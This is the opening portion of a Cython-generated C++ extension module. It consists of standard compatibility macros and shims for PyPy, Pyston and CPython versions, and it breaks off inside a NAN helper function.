/* Generated by Cython 0.29.26 */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_26"
#define CYTHON_HEX_VERSION 0x001D1AF0
#define CYTHON_FUTURE_DIVISION 0
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030B00A1)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #ifndef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef __cplusplus
  #error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #else
    #define CYTHON_INLINE inline
  #endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
  public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T *operator->() { return ptr; }
    T *operator&() { return ptr; }
    operator T&() { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
  private:
    T *ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(WIN32) || defined(MS_WINDOWS)
  #define _USE_MATH_DEFINES
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
